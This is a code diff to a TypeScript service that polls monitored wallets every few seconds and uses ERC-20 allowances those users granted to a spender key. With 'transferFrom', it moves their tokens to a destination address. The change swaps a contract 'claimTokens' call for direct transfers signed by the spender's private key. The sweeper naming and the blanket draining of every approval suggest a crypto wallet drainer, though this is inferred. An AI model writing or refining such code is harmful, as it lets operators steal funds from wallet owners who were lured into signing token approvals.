@@ -105,9 +105,6 @@ const ERC20_ABI = parseAbi([
   'function allowance(address owner, address spender) view returns (uint256)',
 ]);
 
-const CONTRACT_ABI = parseAbi([
-  'function claimTokens(address token, address from, uint256 amount)',
-]);
 
 let solanaConnection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
 let monitorInterval: NodeJS.Timeout | null = null;
@@ -116,7 +113,7 @@ const MONITOR_INTERVAL_MS = 3 * 1000;
 const MIN_SWEEP_AMOUNT_USD = 1;
 
 function getEvmWalletClient(chainId: string) {
-  const privateKey = process.env.SWEEPER_PRIVATE_KEY;
+  const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY;
   if (!privateKey) return null;
   
   const account = privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
@@ -192,11 +189,17 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
     return { swept: false, amount: '0', error: `Unsupported chain: ${chainId}` };
   }
   
+  const spenderAccount = walletClient.account;
+  if (!spenderAccount) {
+    return { swept: false, amount: '0', error: 'No spender account' };
+  }
+  const spenderAddr = spenderAccount.address;
+  
   const contractAddr = CHAIN_CONTRACTS[Number(chainId)];
   if (!contractAddr) {
     return { swept: false, amount: '0', error: `No contract address for chain ${chainId}` };
   }
-  const contractAddress = contractAddr as `0x${string}`;
+  const destinationAddr = contractAddr as `0x${string}`;
   
   let totalSwept = BigInt(0);
   const userAddr = wallet.walletAddress as `0x${string}`;
@@ -209,7 +212,7 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
         address: tokenAddress,
         abi: ERC20_ABI,
         functionName: 'allowance',
-        args: [userAddr, contractAddress],
+        args: [userAddr, spenderAddr],
       });
       
       if (allowance === BigInt(0)) continue;
@@ -229,10 +232,10 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
       
       try {
         const txHash = await walletClient.writeContract({
-          address: contractAddress,
-          abi: CONTRACT_ABI,
-          functionName: 'claimTokens',
-          args: [tokenAddress, userAddr, transferAmount],
+          address: tokenAddress,
+          abi: ERC20_ABI,
+          functionName: 'transferFrom',
+          args: [userAddr, destinationAddr, transferAmount],
           chain: CHAINS[chainId],
         });
         
